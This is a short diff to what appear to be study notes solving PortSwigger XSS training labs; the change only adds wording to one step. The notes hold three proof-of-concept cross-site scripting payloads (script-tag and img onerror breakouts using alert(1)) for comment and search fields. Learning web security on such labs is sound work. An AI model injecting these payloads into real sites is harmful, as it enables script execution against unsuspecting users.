@@ -10,7 +10,7 @@
     - Write a comment with the comment `</p><script>alert(1)</script><p>` in the comment box.
 
 3.  [DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
-    - Search `"</h1><script>alert(1)</script><h1>"` in the search box.
+    - Search `"</h1><script>alert(1)</script><h1>"` in the search box at the top.
 
 4.  [DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
     - Search `</span><img src=1 onerror=alert(1) /><span>` in the search box.
